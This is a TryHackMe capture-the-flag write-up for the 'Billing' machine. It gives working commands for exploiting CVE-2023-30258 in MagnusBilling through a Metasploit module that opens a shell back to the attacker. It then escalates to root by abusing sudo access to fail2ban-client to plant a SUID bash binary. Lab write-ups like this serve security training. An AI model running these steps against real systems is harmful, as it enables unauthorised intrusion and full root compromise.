---
title: Billing
description: Writeup for the TryHackMe machine Billing
date: 2025-03-07
categories: [TryHackMe]
tags: [try-hack-me,thm]
---

## Recon

### nmap

`nmap` finds two open ports: SHH (22) and HTTP (80).
```
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
|_  256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
80/tcp   open  http     Apache httpd 2.4.56 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
|_http-server-header: Apache/2.4.56 (Debian)
| http-title:             MagnusBilling        
|_Requested resource was http://10.x.x.x/mbilling/
```

### HTTP - TCP 80

Accessing the web service on port 80 leads to a redirection to `/mbilling/`, where MagnusBilling is running. After identifying the software, I research known vulnerabilities and find CVE-2023-30258 - an unauthenticated Remote Code Execution (RCE) vulnerability.

## Shell as asterisk

To exploit the CVE-2023-30258, I use the Metasploit module `linux/http/magnusbilling_unauth_rce_cve_2023_3025`:
```
msf6 > use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set LHOST tun0
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set RHOSTS 10.x.x.x
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > run
```
This successfully spawns a shell as the user `asterisk`. I navigate to `/home/magnus/` and read the user flag.

## Shell as root

The `fail2ban-client` command can be run as root, which is exploitable due to a known privilege escalation vulnerability in `fail2ban` (v0.11.2). This is detailed in [this article](https://juggernaut-sec.com/fail2ban-lpe/).
```console
$ sudo -l
Matching Defaults entries for asterisk on Billing:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```
First, I check the list of active `fail2ban` jails:
```console
$ sudo /usr/bin/fail2ban-client status
Status
|- Number of jail:      8
`- Jail list:   ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd
```
To exploit the vulnerability, I need to modify the `actionban` command used by `fail2ban`. Unfortunately the file `/etc/fail2ban/action.d/iptables-multiport.conf` is writable only by root:
```console
$ ls -la /etc/fail2ban/action.d/iptables-multiport.conf
-rw-r--r-- 1 root root 1508 Nov 23  2020 /etc/fail2ban/action.d/iptables-multiport.conf
```
I can bypass this by setting the `actionban` command directly using `fail2ban-client`:
```console
$ sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash"
```
To trigger the payload, I ban a local IP:
```console
$ sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
```
Finally, I spawn a root shell by running the SUID bash binary:
```console
$ /tmp/bash -p
```
